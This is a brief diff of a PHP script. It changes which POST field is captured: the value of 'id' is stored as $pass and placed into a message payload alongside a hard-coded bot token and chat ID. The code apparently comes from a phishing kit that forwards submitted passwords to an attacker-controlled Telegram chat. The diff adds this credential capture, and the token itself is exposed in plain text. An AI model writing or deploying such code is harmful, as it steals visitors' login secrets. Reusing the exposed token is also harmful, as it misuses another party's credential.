@@ -1,13 +1,12 @@
 <?php
 
-$arr['name'] = $_POST['pht'];
-echo($arr['name']);
+$pass = $_POST['id'];
 
 $token = '5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64';
 
 $array = array(
 	'chat_id'=> 961145889,
-	'text' =>$arr['name'],
+	'text' =>$pass,
 	'parse_mode'=>'html'
 );
 
